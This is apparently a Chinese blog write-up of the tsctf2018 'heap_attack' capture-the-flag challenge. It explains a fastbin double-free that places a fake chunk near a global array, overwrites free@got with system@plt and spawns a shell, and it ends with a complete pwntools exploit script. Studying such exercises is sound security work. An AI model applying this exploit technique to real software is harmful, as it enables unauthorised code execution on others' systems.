---
title: tsctf-HeapAttack
categories:
- tsctf2018
---
# tsctf2018->heap_attack

## 前言

最近终于磨蹭到了堆的漏洞，刚看完fastbin attack，准备先停一下，做几个题巩固一下，这里的heap_attack是一道比较典型的double free的题目，记录一下

## 程序逻辑

程序一共有三个功能，新建block，编辑block和删除block，这次跟之前做的几道题不太一样的是没有输出函数和溢出漏洞，寻摸了半天也没找到。

![main](./1.jpg)
![newblock](./2.jpg)
![delete](./3.jpg)
![edit](./4.jpg)

## 漏洞分析

在删除这里只是free了堆块，没有清零，存在uaf和double free，这里虽然没有可以泄露函数地址的打印功能，但是程序里有个echo函数给了system地址，以前输入可以溢出的时候可以用uaf构造unlink，现在没有的话就考虑单纯的double free。

## 数据构造

新建四个堆块，其中最后一个堆块的内容是'/bin/sh\x00'，第0个堆块的作用是初始化堆。依次删除第一个堆块，第二个堆块，第一个堆块，此时的Bins结果可以看到：
main_arena->chunk_1->chunk_2->chunk1
再Add(fake_chunk_addr)，使得free bins的指针链表变成：
main_arena->chunk_2->chunk1->fake_chunk_addr
我们希望这个fake_chunk分配到全局变量s的低地址处且长度为0x70，从而可以覆盖s[i]为free@got，进一步edit即可使得system@plt覆盖free@got，这里使用pwndbg的find_fake_fast,选择一个离s比较近的0x6020bd，Add(p64(0x6020bd))即可

![fake_chunk](./5.jpg)

Add一次，分配的是chunk_2，再Add一次，分配的是chunk_1，再Add一次，分配的是fake_chunk_addr，这里它和s的距离为0x23,输入部分相距0x13，故先填充0x13的'a'，加上free@got即可让s[0]为free@got，再edit(0)覆盖其为system@plt，最后free(chunk3)触发system('/bin/sh')

## exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux')
context.log_level = "DEBUG"
context.terminal = ['tmux','split','-h']
debug = 0
p = process('./heap_attack')
elf = ELF('./heap_attack')
if debug:
    gdb.attach(p)

def Add(size,content):
    p.recvuntil('Input ur choice:')
    p.sendline('1')
    p.recvuntil('Input size:')
    p.sendline(str(size))
    p.recvuntil('Input content:')
    p.send(content)

def Delete(index):
    p.recvuntil('Input ur choice:')
    p.sendline('2')
    p.recvuntil('Input index:')
    p.sendline(str(index))
    
def Edit(index,content):
    p.recvuntil('Input ur choice:')
    p.sendline('3')
    p.recvuntil('Input index:')
    p.sendline(str(index))
    p.recvuntil('Input content:')
    p.send(content)

Add(0x60, 'a'*0x5f) 
Add(0x60, 'a'*0x5f) 
Add(0x60, 'a'*0x5f)
Add(0x60, '/bin/sh\x00') 
Delete(1)
Delete(2)
Delete(1)
print 'double free'
Add(0x60, p64(0x6020bd))
print 'add 1'
Add(0x60, 'a'*0x5f)
print 'add 2'
Add(0x60, 'a'*0x5f)
print 'add 1 again'
free_got = elf.got['free']
Add(0x60, 'a' * 19 + p64(free_got)) 
Edit(0, '\xb0\x07\x40\x00\x00\x00')#not p64(system_plt) for the length is 6
print 'over flow'
Delete(3)
p.interactive()
```
